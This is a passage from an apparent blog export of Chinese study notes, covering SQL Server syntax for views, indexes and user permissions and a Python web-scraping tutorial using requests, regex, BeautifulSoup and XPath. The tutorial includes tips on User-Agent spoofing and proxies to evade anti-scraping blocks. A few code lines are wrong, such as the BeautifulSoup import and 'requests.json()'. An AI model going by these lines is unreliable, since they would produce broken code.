不设置返回视图引用的metadate，否则返回视图自身的metadata。</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="2-修改视图"><a href="#2-修改视图" class="headerlink" title="2 修改视图"></a>2 修改视图</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">view</span> view_name</span><br><span class="line"><span class="keyword">as</span> <span class="operator">&lt;</span>子查询<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="3-查询视图"><a href="#3-查询视图" class="headerlink" title="3 查询视图"></a>3 查询视图</h3><blockquote><p>和表一样。</p></blockquote><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="4-删除视图"><a href="#4-删除视图" class="headerlink" title="4 删除视图"></a>4 删除视图</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">view</span> view_name</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="5-视图操作"><a href="#5-视图操作" class="headerlink" title="5 视图操作"></a>5 视图操作</h3><blockquote><p>数据操作和表一样。</p></blockquote><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><hr><h2 id="四、索引"><a href="#四、索引" class="headerlink" title="四、索引"></a>四、索引</h2><h3 id="1-创建索引"><a href="#1-创建索引" class="headerlink" title="1 创建索引"></a>1 创建索引</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> [ <span class="keyword">unique</span> ] [ clustered <span class="operator">|</span> nonclustered ] index index_name</span><br><span class="line"><span class="keyword">on</span> table_or_view_name ( column_name [ <span class="keyword">asc</span> <span class="operator">|</span> <span class="keyword">desc</span> ] [ , ... n ] )</span><br><span class="line">[ <span class="keyword">with</span> <span class="operator">&lt;</span> index_option <span class="operator">&gt;</span> [ , ... n] ]</span><br><span class="line">[ <span class="keyword">on</span> &#123; filegroup_name <span class="operator">|</span> &quot;default&quot; &#125; ]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- unique：唯一索引</span></span><br><span class="line"><span class="comment">-- clustered：聚集索引</span></span><br><span class="line"><span class="comment">-- nonclustered：非聚集索引</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="2-修改索引"><a href="#2-修改索引" class="headerlink" title="2 修改索引"></a>2 修改索引</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="3-删除索引"><a href="#3-删除索引" class="headerlink" title="3 删除索引"></a>3 删除索引</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">drop</span> index <span class="operator">&lt;</span>index name<span class="operator">&gt;</span> <span class="keyword">on</span> <span class="operator">&lt;</span><span class="keyword">table</span> <span class="keyword">or</span> view_name<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="4-查看索引"><a href="#4-查看索引" class="headerlink" title="4 查看索引"></a>4 查看索引</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 查看索引</span><br><span class="line"><span class="keyword">exec</span> sp_helpindex [<span class="variable">@objname</span> <span class="operator">=</span>] <span class="string">&#x27;name&#x27;</span></span><br><span class="line"># 改索引名</span><br><span class="line"><span class="keyword">exec</span> sp_rename <span class="string">&#x27;index_name&#x27;</span> <span class="string">&#x27;index_newname&#x27;</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><hr><h2 id="五、用户"><a href="#五、用户" class="headerlink" title="五、用户"></a>五、用户</h2><blockquote><p>  <a href="https://www.cnblogs.com/adamans/articles/12023579.html">用户操作</a></p></blockquote><h3 id="1-创建用户"><a href="#1-创建用户" class="headerlink" title="1 创建用户"></a>1 创建用户</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建登入用户</span></span><br><span class="line"><span class="keyword">create</span> login login_name <span class="keyword">with</span> password <span class="operator">=</span> <span class="string">&#x27;passwd&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建数据库用户</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> user_name [<span class="keyword">for</span> login login_name]</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="2-修改用户"><a href="#2-修改用户" class="headerlink" title="2 修改用户"></a>2 修改用户</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="3-删除用户"><a href="#3-删除用户" class="headerlink" title="3 删除用户"></a>3 删除用户</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="4-赋予权限"><a href="#4-赋予权限" class="headerlink" title="4 赋予权限"></a>4 赋予权限</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">create</span>  <span class="keyword">on</span> database_name <span class="keyword">to</span> user_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">exec</span> sp_addrolemember <span class="string">&#x27;db_owner&#x27;</span> <span class="string">&#x27;user_name&#x27;</span></span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="5-移除权限"><a href="#5-移除权限" class="headerlink" title="5 移除权限"></a>5 移除权限</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">create</span> <span class="keyword">on</span> database_name <span class="keyword">from</span> user_name</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><hr><h2 id="六、规则与默认"><a href="#六、规则与默认" class="headerlink" title="六、规则与默认"></a>六、规则与默认</h2><h3 id="1-创建规则"><a href="#1-创建规则" class="headerlink" title="1  创建规则"></a>1  创建规则</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="2-删除规则"><a href="#2-删除规则" class="headerlink" title="2 删除规则"></a>2 删除规则</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="3-绑定规则"><a href="#3-绑定规则" class="headerlink" title="3 绑定规则"></a>3 绑定规则</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="1-创建默认"><a href="#1-创建默认" class="headerlink" title="1 创建默认"></a>1 创建默认</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="2-删除默认"><a href="#2-删除默认" class="headerlink" title="2 删除默认"></a>2 删除默认</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="3-绑定默认"><a href="#3-绑定默认" class="headerlink" title="3 绑定默认"></a>3 绑定默认</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">...</span><br></pre></td></tr></table></figure><hr><h2 id="七、案例查询"><a href="#七、案例查询" class="headerlink" title="七、案例查询"></a>七、案例查询</h2><h3 id="1-所有查询"><a href="#1-所有查询" class="headerlink" title="1 所有查询"></a>1 所有查询</h3><p>语句</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 查询所有数据表</span></span><br><span class="line"><span class="keyword">select</span> name <span class="keyword">from</span> sysobjects <span class="keyword">where</span> type <span class="operator">=</span> <span class="string">&#x27;U&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> name</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询所有约束</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sys.objects <span class="keyword">where</span> type <span class="keyword">in</span> (<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;pk&#x27;</span>,<span class="string">&#x27;uq&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询所有视图</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype<span class="operator">=</span><span class="string">&#x27;V&#x27;</span></span><br></pre></td></tr></table></figure><hr><h2 id="八、提示"><a href="#八、提示" class="headerlink" title="八、提示"></a>八、提示</h2><blockquote><p>引号中打引号用 <code>&#39;&#39;</code> （两个单引号）</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Web后端 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫</title>
      <link href="/posts/c386cf1b.html"/>
      <url>/posts/c386cf1b.html</url>
      
        <content type="html"><![CDATA[<h1 id="Python爬虫"><a href="#Python爬虫" class="headerlink" title="Python爬虫"></a>Python爬虫</h1><blockquote><p><a href=".\a378bd8e">text::Python</a> </p><p><a href=".\9ce61be">text::Html+CSS</a> </p><p><a href=".\e255a10a">text::计算机网络</a> </p></blockquote><hr><h2 id="一、基础知识"><a href="#一、基础知识" class="headerlink" title="一、基础知识"></a>一、基础知识</h2><h3 id="1-爬虫防抓"><a href="#1-爬虫防抓" class="headerlink" title="1 爬虫防抓"></a>1 爬虫防抓</h3><blockquote><ol><li>严格遵守网站设置的robots协议。</li><li>在规避反爬虫措施的同时，需要优化自己的代码，避免干扰被访问网站的正常运行。</li><li>在设置抓取策略时，应注意编码抓取视频、音乐等可能构成作品的数据，或者针对某些特定网站批量抓取其中的用户生成内容。</li><li>在使用、传播抓取到的信息时，应审查所抓取的内容，如发现属于用户的个人信息、隐私或者他人的商业秘密的，应及时停止并删除。</li></ol></blockquote><h3 id="2-爬虫分类"><a href="#2-爬虫分类" class="headerlink" title="2 爬虫分类"></a>2 爬虫分类</h3><blockquote><p>通用爬虫：抓取系统重要组成部分，抓取的是一整张页面：</p><ol><li>指定url<ol><li>发起请求</li></ol></li><li>获取响应数据</li><li>持久化存储</li></ol><p>聚焦爬虫：建立在通用爬虫基础之上，抓取的是页面特定的局部内容：</p><ol><li>指定url</li><li>发起请求</li><li>获取响应数据<ol><li>数据解析</li></ol></li><li>持久化存储</li></ol><p>增量式爬虫：监测网站中数据更新的情况，只会抓取网站更新出来的数据。</p></blockquote><h3 id="3-反爬机制与反反爬策略"><a href="#3-反爬机制与反反爬策略" class="headerlink" title="3 反爬机制与反反爬策略"></a>3 反爬机制与反反爬策略</h3><div class="table-container"><table><thead><tr><th>反爬机制</th><th>解释</th></tr></thead><tbody><tr><td>robots.txt协议</td><td>君子协议。规定了网站中哪些数据可以被爬取，哪些数据不可以被爬取。（没有强制限定)</td></tr><tr><td>UA检测：检测身份</td><td>门户网站会检测请求载体的身份，若不是基于某一浏览器的，则表示该请求不正常，服务器很可能会拒绝该次请求。</td></tr><tr><td>IP封锁</td><td>封锁IP。</td></tr></tbody></table></div><div class="table-container"><table><thead><tr><th>反反爬策略</th><th>解释</th></tr></thead><tbody><tr><td>UA伪装：伪装成某一浏览器</td><td>具体：requests库——UA伪装。</td></tr><tr><td>代理</td><td>解决IP封锁问题</td></tr></tbody></table></div><p><a href="https://baike.sogou.com/v62040012.htm?fromTitle=robots.txt">robots协议</a></p><div class="table-container"><table><thead><tr><th>案例</th><th>代码</th></tr></thead><tbody><tr><td>全部禁止</td><td>User-agent:*  <br>Disallow: /</td></tr><tr><td>全部允许</td><td>User-agent:*  <br>Allow: /</td></tr><tr><td>仅禁止某一些爬虫</td><td>User-agent:Baiduspider  <br>Disallow: /</td></tr><tr><td>仅允许某一些爬虫</td><td>User-agent:Baiduspider  <br>Allow: / <br>User-agent:Googlebot <br>Allow: / <br>User-agent:*  <br>Disallow: /</td></tr></tbody></table></div><hr><h2 id="二、数据爬取"><a href="#二、数据爬取" class="headerlink" title="二、数据爬取"></a>二、数据爬取</h2><h3 id="1-requests库定义"><a href="#1-requests库定义" class="headerlink" title="1 requests库定义"></a>1 requests库定义</h3><blockquote><p>定义：Python中原生的一款基于网络请求的模块。</p><p>作用：模拟浏览器发送请求。</p></blockquote><h3 id="2-简单流程"><a href="#2-简单流程" class="headerlink" title="2 简单流程"></a>2 简单流程</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 1、指定url</span></span><br><span class="line">url = <span class="string">&quot;https://123.sogou.com/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、发起请求</span></span><br><span class="line">response =  requests.get(url=url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、获取响应数据</span></span><br><span class="line">page_text = response.text</span><br><span class="line"><span class="built_in">print</span>(page_text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4、持久化存储</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./save.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    fp.write(page_text)</span><br></pre></td></tr></table></figure><h3 id="3-详细请求"><a href="#3-详细请求" class="headerlink" title="3 详细请求"></a>3 详细请求</h3><blockquote><p><a href="https://cloud.tencent.com/developer/article/1648157">get与post参数</a></p><p><a href="https://www.cnblogs.com/wind-zhou/p/12973197.html">post方法</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># get请求</span></span><br><span class="line"><span class="comment"># 字典封装参数</span></span><br><span class="line">param = &#123;<span class="string">&quot;query&quot;</span>:value&#125; <span class="comment"># 请求参数</span></span><br><span class="line">header = &#123;<span class="string">&quot;User-Agent &quot;</span>:value&#125; <span class="comment"># 报头</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起请求（url，超时时间，参数，报头）</span></span><br><span class="line">response = requests.get(url=url,timeout=<span class="number">15</span>,params=param,headers=header)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># post请求</span></span><br><span class="line"><span class="comment"># 字典封装参数</span></span><br><span class="line">data = &#123;&#125; <span class="comment"># 表单字典</span></span><br><span class="line">file = &#123;<span class="string">&quot;name&quot;</span>:(path,param),...&#125; <span class="comment"># files：文件上传字典</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发起请求（url，超时时间，参数，报头，[文件上传]）</span></span><br><span class="line">response = requests.post(url=url,timeout=<span class="number">15</span>,data=data ,headers=header,[files=file])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 处理数据</span></span><br><span class="line">data = response.text / text() <span class="comment"># 文本</span></span><br><span class="line">data = response.content / read() <span class="comment"># 二进制</span></span><br><span class="line">data = response.json / json() <span class="comment"># 对象</span></span><br></pre></td></tr></table></figure><h3 id="4-其他情况"><a href="#4-其他情况" class="headerlink" title="4 其他情况"></a>4 其他情况</h3><blockquote><p>UA：User-Agent，代理。</p><p>门户网站会检测请求载体的身份，若不是基于某一浏览器的，则表示该请求不正常，服务器很可能会拒绝该次请求。</p><p><a href="https://blog.csdn.net/m_S_L/article/details/89460964">XHR</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># UA伪装</span></span><br><span class="line"><span class="comment"># 头伪装参数</span></span><br><span class="line">User-Agent=value <span class="comment"># 代理服务器</span></span><br><span class="line">referer=value <span class="comment"># 链接来源网址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 伪装案例</span></span><br><span class="line">header = &#123;<span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ajax请求</span></span><br><span class="line"><span class="comment"># 网址是：https://fanyi.baidu.com/sug（是ajax请求新更新的网址）</span></span><br><span class="line">data = &#123;<span class="string">&quot;kw&quot;</span>:value&#125;</span><br><span class="line">header = &#123;<span class="string">&quot;User-Agent&quot;</span>:value&#125;</span><br><span class="line">response = requests.post(url=url,timeout=<span class="number">15</span>,data=data,headers=header)</span><br><span class="line">dic_json = requests.json()</span><br></pre></td></tr></table></figure><h3 id="5-技巧"><a href="#5-技巧" class="headerlink" title="5 技巧"></a>5 技巧</h3><blockquote><p>有的页面数据并不是直接存在html中的，而是通过ajax请求获得了一次。</p><p>新生成的页面可能域名是一致的，但是参数不一致。</p><p>F12——Ctrl + F：搜索</p></blockquote><hr><h2 id="三、数据解析"><a href="#三、数据解析" class="headerlink" title="三、数据解析"></a>三、数据解析</h2><h3 id="1-原理"><a href="#1-原理" class="headerlink" title="1 原理"></a>1 原理</h3><blockquote><p>标签定位。提取标签、标签属性中存储的数据值。</p></blockquote><h3 id="2-re库"><a href="#2-re库" class="headerlink" title="2 re库"></a>2 re库</h3><p>正则表达式</p><blockquote><p><a href="https://github.com/ziishaned/learn-regex/blob/master/translations/README-cn.md#learn-regex">正则表达式教程</a>    </p><p><a href="https://regex101.com/">测试网站</a></p><p><a href="https://www.cnblogs.com/fozero/p/7868687.html">常用正则表达式大全</a></p></blockquote><div class="table-container"><table><thead><tr><th>普通使用</th><th>解释</th></tr></thead><tbody><tr><td>e?</td><td>e 出现 0-1 次</td></tr><tr><td>b*</td><td>b 出现 0-n 次</td></tr><tr><td>h+</td><td>h 出现 1-n 次</td></tr><tr><td>b{}</td><td>出现次数限定，b{6}（6次），b{2,6}（2-6次），b{2,}（2次以上）</td></tr><tr><td>[]</td><td>指定字符范围。<code>[a-z]</code>，<code>[a-zA-Z]</code>，<code>[a-zA-Z0-9]</code>，<code>[^0-9]</code>（除0-9外所有字符（包括元字符））</td></tr><tr><td>(ab)+</td><td>ab 出现 1-n 次</td></tr><tr><td>`(cat</td><td>dog)`</td><td>cat 或 dog</td></tr><tr><td></td><td></td></tr><tr><td><strong>特殊字符</strong></td><td><strong>解释</strong></td></tr><tr><td>\d</td><td>数字字符</td></tr><tr><td>\D</td><td>非数字字符</td></tr><tr><td>\w</td><td>英文、数字及下划线</td></tr><tr><td>\W</td><td>非单词字符</td></tr><tr><td>\s</td><td>空白符（tab和换行）</td></tr><tr><td>\S</td><td>非空白字符</td></tr><tr><td>\b</td><td>单词开头或结尾，单词的分界处</td></tr><tr><td>.</td><td>任意字符（不包换行符 ）</td></tr><tr><td>^a</td><td>只匹配行首a，头要是a</td></tr><tr><td>a$</td><td>只匹配行尾a，尾要是a</td></tr><tr><td></td><td></td></tr><tr><td><strong>使用技巧</strong></td><td><strong>解释</strong></td></tr><tr><td>标签匹配</td><td>&lt;.+?&gt;。不加 ? 会全匹配，加了会从贪婪匹配变成懒惰匹配</td></tr><tr><td>RGB十六进制匹配</td><td>#[a-fA-F0-9]{6}\b</td></tr><tr><td>IPv4匹配</td><td>`\b((25[0-5]</td><td>2[0-4]\d</td><td>[01]?\d\d?).){3}(25[0-5]</td><td>2[0-4]\d</td><td>[01]?\d\d?)\b（会匹配：00.00.00.00）`</td></tr><tr><td></td></tr></tbody></table></div><p>re库</p><blockquote><p><a href="https://www.runoob.com/python/python-reg-expressions.html">python的re</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译正则表达式</span></span><br><span class="line">pattern = re.<span class="built_in">compile</span>(pattern,flags)。</span><br><span class="line"><span class="comment"># 找到第一个，输出是 lst.group()</span></span><br><span class="line">lst = pattern.search(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment"># 找到所有。（数据解析：re.S）</span></span><br><span class="line">lst = pattern.findall(<span class="built_in">str</span>,flags)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 贪婪匹配与非贪婪匹配</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">strs = <span class="string">&quot;&lt;a&gt;Hello&lt;/a&gt;&lt;a&gt;World&lt;/a&gt;&quot;</span></span><br><span class="line"></span><br><span class="line">greedy = re.findall(<span class="string">&quot;&lt;a&gt;(.*)&lt;/a&gt;&quot;</span>, strs)</span><br><span class="line">nonGreedy = re.findall(<span class="string">&quot;&lt;a&gt;(.*?)&lt;/a&gt;&quot;</span>, strs)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(greedy) <span class="comment"># 贪婪：[&#x27;Hello&lt;/a&gt;&lt;a&gt;World&#x27;]</span></span><br><span class="line"><span class="built_in">print</span>(nonGreedy) <span class="comment"># 非贪婪：[&#x27;Hello&#x27;, &#x27;World&#x27;]</span></span><br></pre></td></tr></table></figure><h3 id="3-BeautifulSoup库"><a href="#3-BeautifulSoup库" class="headerlink" title="3 BeautifulSoup库"></a>3 BeautifulSoup库</h3><blockquote><p>原理</p><ol><li>实例化一个BeautifulSoup对象，并且将页面源码数据加载到该对象中。</li><li>通过调用BeautifulSoup对象中相关的属性或者方法进行标签定位和数据提取。</li></ol></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入</span></span><br><span class="line">pip install beautifulsoup4</span><br><span class="line">pip install lxml</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> bs4 <span class="keyword">from</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化BeautifulSoup对象</span></span><br><span class="line"><span class="comment"># 本地加载</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;0.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    soup = BeautifulSoup(f,<span class="string">&quot;lxml&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络加载</span></span><br><span class="line">page_text = response.text</span><br><span class="line">soup = BeautifulSoup(page_text,<span class="string">&quot;lxml&quot;</span>)</span><br></pre></td></tr></table></figure><p>属性和方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 取得标签</span></span><br><span class="line"><span class="comment"># 返回html第一次出现的标签（tagName：填tag名称）</span></span><br><span class="line">soup.tagName</span><br><span class="line"><span class="comment"># 同理于soup.tagName（attr填标签属性，以此找到第一个满足条件的标签，例：type=&quot;text/javascript&quot;（class要加下划线变成class_）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 发现一个标签</span></span><br><span class="line">soup.find(<span class="string">&quot;tag&quot;</span>[,attr])</span><br><span class="line">soup.find(class_ = <span class="string">&#x27;item-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 满足要求的所有标签</span></span><br><span class="line">soup.find_all(<span class="string">&quot;tag&quot;</span> [,attr])</span><br><span class="line">soup.find_all(attrs=&#123;<span class="string">&#x27;class&#x27;</span>:<span class="string">&#x27;item-1&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 返回一个满足要求的标签的列表</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">selector：id(#)，class(.)，标签选择器，例：</span></span><br><span class="line"><span class="string">soup.select(&quot;.tang &gt; ul &gt; li &gt; a&quot;)（ &gt; ：一个层级，space：多个层级）</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">soup.select(<span class="string">&quot;selector&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得文本</span></span><br><span class="line">soup.tagName.text/string/get_text()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得某一个标签中的所有内容</span></span><br><span class="line">text/get_text()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只获得该标签的直系内容（标签中标签的内容无法获得）</span></span><br><span class="line">string</span><br><span class="line"></span><br><span class="line"><span class="comment"># 整理文本</span></span><br><span class="line"><span class="comment"># 按照标准缩进格式输出</span></span><br><span class="line">soup.prettify()</span><br></pre></td></tr></table></figure><p>简单使用</p><blockquote><p><a href="https://www.jb51.net/article/202379.htm">bs4简单使用</a></p></blockquote><h3 id="4-xpath库"><a href="#4-xpath库" class="headerlink" title="4 xpath库"></a>4 xpath库</h3><blockquote><p>优势：最常用且最便捷高效的一种解析方式，通用性强，可以用于别的语言。</p><p>原理：</p><ol><li>实例化一个etree对象，并且将页面源码数据加载到该对象中。</li><li>通过调用etree对象中xpath方法结合着xpath表达式实现标签的定位和内容的捕获。</li></ol></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 导入</span></span><br><span class="line">pip install lxml</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化etree对象</span></span><br><span class="line"><span class="comment"># 本地加载</span></span><br><span class="line">parser = etree.HTMLParser(encoding=<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">et = etree.parse( filePath,parser=parser)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网络加载</span></span><br><span class="line">et = etree.HTML( page_text)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 返回：一个列表，包含所有满足条件的&lt;Element LabelName&gt;</span></span><br><span class="line">res = et.xpath( <span class="string">&quot;xpath表达式&quot;</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># ./：从当前标签开始（li开始，先取到li）</span></span><br><span class="line">res = li.xpath(<span class="string">&quot;./div&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># / ：表示从根节点开始定位</span></span><br><span class="line">res = et.xpath(<span class="string">&quot;/html/head/script&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># // ：表示多个层级，或表示从任意位置开始定位</span></span><br><span class="line">res = et.xpath(<span class="string">&quot;/html//script&quot;</span>)</span><br><span class="line">res = et.xpath(<span class="string">&quot;//script&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [@label= &quot;value&quot;]：表示属性定位</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[@type=&quot;text/javascript&quot;]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [num]：表示第几个标签（索引从1开始）</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[@type=&quot;text/javascript&quot;][1]&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /text()：获取标签中直系的文本内容</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[@type=&quot;text/javascript&quot;][1]/text()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># //text()：获取标签中非直系的文本内容</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[@type=&quot;text/javascript&quot;][1]//text()&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># /@attrName：获取标签中的属性值</span></span><br><span class="line">res = et.xpath(<span class="string">&#x27;//script[2]/@type&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="四、数据存储"><a href="#四、数据存储" class="headerlink" title="四、数据存储"></a>四、数据存储</h2><h3 id="1-json"><a href="#1-json" class="headerlink" title="1 json"></a>1 json</h3><blockquote><p><a href="https://www.cnblogs.com/qlqwjy/p/11576746.html">json库</a>    </p><p><a href="https://zhuanlan.zhihu.com/p/440587133?utm_id=0">loads链接</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 存入文件（获取的数据中有中文，设置ascii存储关闭）</span></span><br><span class="line">json.dump(data,fp,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 字符串变json</span></span><br><span class="line">res 